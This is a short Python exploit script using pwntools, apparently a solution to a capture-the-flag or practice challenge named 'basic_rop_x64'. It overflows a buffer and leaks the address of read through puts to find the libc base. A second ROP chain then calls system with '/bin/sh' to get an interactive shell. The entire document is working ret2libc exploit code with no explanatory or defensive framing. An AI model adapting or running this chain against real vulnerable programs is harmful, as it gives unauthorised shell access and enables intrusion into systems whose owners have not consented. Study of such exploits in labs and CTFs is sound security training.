from pwn import *

elf = context.binary = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript="b *main\nc")
    return process(elf.path)

p = start()

offset  = 0x48
pop_rdi = 0x400883
ret     = 0x400819   

# stage 1: leak read
payload1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["read"],
    elf.plt["puts"],
    elf.sym["main"]
)

p.send(payload1)

data = p.recvline()
leak = data[0x40:-1]
read_leak = u64(leak.ljust(8, b"\x00"))
libc.address = read_leak - libc.sym["read"]
system = libc.sym["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))
payload2 = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    binsh,
    system
)

p.send(payload2)
p.interactive()
